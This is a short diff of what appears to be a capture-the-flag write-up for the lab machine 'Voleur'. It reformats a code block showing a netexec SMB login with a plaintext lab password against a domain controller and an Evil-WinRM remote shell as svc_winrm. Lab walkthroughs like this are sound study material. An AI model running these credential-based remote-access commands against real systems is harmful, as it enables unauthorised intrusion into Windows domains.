@@ -221,7 +221,8 @@ $ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.ht
 <SNIP>
 
 $ sudo cp krb5.conf /etc/krb5.conf              
-$ evil-winrm -i dc.voleur.htb -u 'svc_winrm'  -r VOLEUR.HTB                      <SNIP>
+$ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -r VOLEUR.HTB
+<SNIP>
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents>  
 ```
 
